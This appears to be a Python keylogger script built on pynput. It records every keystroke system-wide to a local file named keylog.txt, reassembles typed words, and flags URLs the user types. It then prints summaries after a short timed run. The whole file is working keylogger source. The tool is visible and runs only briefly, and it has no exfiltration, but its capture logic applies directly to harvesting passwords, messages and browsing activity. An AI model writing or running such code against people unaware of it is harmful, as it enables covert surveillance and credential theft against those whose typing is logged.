import pynput
from pynput.keyboard import Key, Listener
import logging
import time
import re

# Configure logging to save keystrokes to a file
# The file 'keylog.txt' will be created in the same directory as the script.
# This setup works on both Windows and macOS.
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the duration for the keylogger to run (in seconds)
RUN_DURATION_SECONDS = 10 # Change for testing purposes

# Create a list to store keystrokes
keystroke_list = []

# Create a list to store words
words_list = []

# Create a list to store potential websites
websites_list = []

# Current word being built
current_word = ""

def is_website(text):
    """
    Check if the given text looks like a website URL
    """
    # Common website patterns
    website_patterns = [
        r'https?://',  # http:// or https://
        r'www\.',      # www.
        r'\.com$',     # ends with .com
        r'\.org$',     # ends with .org
        r'\.net$',     # ends with .net
        r'\.edu$',     # ends with .edu
        r'\.gov$',     # ends with .gov
        r'\.io$',      # ends with .io
        r'\.co$',      # ends with .co
        r'\.app$',     # ends with .app
    ]
    
    for pattern in website_patterns:
        if re.search(pattern, text, re.IGNORECASE):
            return True
    return False

def process_word(word):
    """
    Process a completed word and categorize it
    """
    if word.strip():  # Only process non-empty words
        words_list.append(word)
        
        # Check if it's a website
        if is_website(word):
            websites_list.append(word)
            logging.info(f"WEBSITE DETECTED: {word}")
        
        logging.info(f"WORD COMPLETED: {word}")

def on_press(key):
    """
    This function is called when a key is pressed.
    It logs the key press to the 'keylog.txt' file and adds it to a list.
    Special keys like Space, Enter, Shift, etc., are explicitly named.
    """
    global current_word
    
    try:
        keystroke = str(key.char)
        logging.info(keystroke)
        keystroke_list.append(keystroke)
        
        # Add character to current word
        current_word += keystroke
        
    except AttributeError:
        # Handle special keys (e.g., Space, Enter, Shift)
        if key == Key.space:
            keystroke = " "
            logging.info(keystroke)
            keystroke_list.append(keystroke)
            
            # Process the completed word when space is pressed
            if current_word:
                process_word(current_word)
                current_word = ""  # Reset for next word
                
        elif key == Key.enter:
            keystroke = "\n"
            logging.info(keystroke)
            keystroke_list.append(keystroke)
            
            # Process the completed word when enter is pressed
            if current_word:
                process_word(current_word)
                current_word = ""  # Reset for next word
                
        elif key == Key.backspace:
            # Handle backspace - remove last character from current word
            if current_word:
                current_word = current_word[:-1]
            logging.info("BACKSPACE")
            keystroke_list.append("BACKSPACE")
            
        else:
            keystroke = str(key)
            logging.info(keystroke)
            keystroke_list.append(keystroke)

# The on_release function is no longer needed to stop the logger,
# as it will now stop automatically after a set duration.
# However, we keep a minimal on_release to satisfy the Listener's requirement,
# or for potential future use (e.g., custom stop conditions based on release).
def on_release(key):
    """
    This function is called when a key is released.
    It currently does not contain logic to stop the keylogger,
    as the script is designed to stop after a defined duration.
    """
    pass # No action needed on key release for automatic timeout


print(f"Keylogger started. It will run for {RUN_DURATION_SECONDS} seconds.")
print("Keystrokes will be logged to 'keylog.txt' and stored in a list.")
print("Words and websites will be identified and categorized.")

# Set up the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Join the listener thread to the main thread with a timeout.
    # After the timeout, the main thread will continue, and the 'with' block
    # will implicitly stop the listener.
    listener.join(timeout=RUN_DURATION_SECONDS)

# Process any remaining word
if current_word:
    process_word(current_word)

print("Keylogger stopped after the specified duration.")
print(f"\nTotal keystrokes captured: {len(keystroke_list)}")
print(f"Total words identified: {len(words_list)}")
print(f"Total websites detected: {len(websites_list)}")

print("\nKeystroke list:")
print(keystroke_list)

print("\nWords identified:")
for i, word in enumerate(words_list, 1):
    print(f"{i}. {word}")

if websites_list:
    print("\nWebsites detected:")
    for i, website in enumerate(websites_list, 1):
        print(f"{i}. {website}")

# Create a string from the list for easier reading
keystroke_string = ''.join(keystroke_list)
print(f"\nKeystrokes as string:")
print(keystroke_string)

# Analyze word patterns
if len(words_list) > 1:
    print("\nWord analysis:")
    print(f"Average word length: {sum(len(word) for word in words_list) / len(words_list):.2f} characters")
    
    # Find potential lists (words separated by spaces)
    word_groups = []
    current_group = []
    
    for i, char in enumerate(keystroke_list):
        if char == " ":
            if current_group:
                word_groups.append(''.join(current_group))
                current_group = []
        elif char not in ["\n", "BACKSPACE"]:
            current_group.append(char)
    
    if current_group:
        word_groups.append(''.join(current_group))
    
    if word_groups:
        print(f"Potential word groups detected: {len(word_groups)}")
        for i, group in enumerate(word_groups, 1):
            if group.strip():
                print(f"  Group {i}: '{group.strip()}'")
